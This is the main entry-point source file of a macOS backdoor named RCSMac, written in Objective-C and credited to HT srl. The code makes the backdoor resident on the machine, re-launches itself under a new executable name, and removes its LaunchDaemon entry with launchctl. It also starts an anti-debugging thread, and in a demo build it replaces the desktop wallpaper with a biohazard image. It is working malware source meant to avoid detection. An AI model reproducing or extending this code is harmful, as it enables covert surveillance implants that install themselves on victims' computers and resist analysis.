/*
 * RCSMac
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 23/03/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Cocoa/Cocoa.h>

#import "RCSMCore.h"
#import "RCSMCommon.h"

#import "RCSMDesktopImage.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

extern void lionSendEventToPid(pid_t pid);

int main (int argc, const char *argv[])
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
 
  // Fix for lion: AppleEvents only from unhidden proc
  if (argc > 1) 
  {
    if (argv[2] && 
        (strncmp(argv[2], "-p", strlen("-p")) == 0)) 
    {
      pid_t pid = atoi(argv[3]);
      
#ifdef DEBUG_CORE
      for (int i =0; i < argc; i++) 
        infoLog(@"param[%d]=%s", i, argv[i]);
#endif
      
      lionSendEventToPid(pid);
      
      [pool release];
      
      exit(0);
    }
  }
  
  NSString *offlineFlagPath = [[NSString alloc] initWithFormat: @"%@/off.flg",
                               [[NSBundle mainBundle] bundlePath]];

#ifdef ENABLE_LOGGING
  [RCSMLogger setComponent: @"core"];
  infoLog(@"STARTING");
#endif
  
  gUtil = [RCSMUtils sharedInstance];
  RCSMCore *core = [[RCSMCore alloc] init];
  
  //
  // Check if we've been installed by offline cd
  //
  if ([[NSFileManager defaultManager] fileExistsAtPath: offlineFlagPath])
    {
      [[NSFileManager defaultManager] removeItemAtPath: offlineFlagPath
                                                 error: nil];
      
      // Force it
      [core makeBackdoorResident];
      
      //
      // Executing ourself with the new executable name and exit
      //
      [gUtil executeTask: [[NSBundle mainBundle] executablePath]
           withArguments: nil
            waitUntilEnd: NO];
      
      //
      // Remove the LaunchDaemon plist
      //
      NSString *backdoorPlist = [NSString stringWithFormat: @"%@/%@",
                                 [[[[[NSBundle mainBundle] bundlePath]
                                    stringByDeletingLastPathComponent]
                                   stringByDeletingLastPathComponent]
                                  stringByDeletingLastPathComponent],
                                 BACKDOOR_DAEMON_PLIST ];
      
      //
      // Unload our service from LaunchDaemon
      //
      NSArray *_commArguments = [[NSArray alloc] initWithObjects:
                                 @"remove",
                                 [[backdoorPlist lastPathComponent]
                                  stringByDeletingPathExtension],
                                 nil];
      [gUtil executeTask: @"/bin/launchctl"
           withArguments: _commArguments
            waitUntilEnd: YES];
      
      exit(0);
    }
  
  [offlineFlagPath release];
  
#ifdef DEMO_VERSION
  NSString *appName = [[[NSBundle mainBundle] executablePath] lastPathComponent];
  
  if ([appName isEqualToString: @"System Preferences"] == FALSE)
    {
      if (getuid() != 0 && geteuid() != 0)
        {
          NSString *filePath = [[NSString alloc] initWithFormat: @"%@/bio.bmp",
                                NSHomeDirectory()];
          
          NSData *bmpData = [[NSData alloc] initWithBytes: biohazard_bmp
                                                   length: biohazard_bmp_len];
          [bmpData writeToFile: filePath atomically: YES];
          
          changeDesktopBackground(filePath, FALSE);
          
          [filePath release];
          [bmpData release];
        }
    }
#endif
  
  //
  // Spawn a thread who checks whenever a debugger is attaching our app
  //
#ifndef NO_ANTIDEBUGGING
  [NSThread detachNewThreadSelector: @selector(xfrth)
                           toTarget: core
                         withObject: nil];
#endif
  
  [core runMeh];
  [pool drain];
  
  return 0;
}
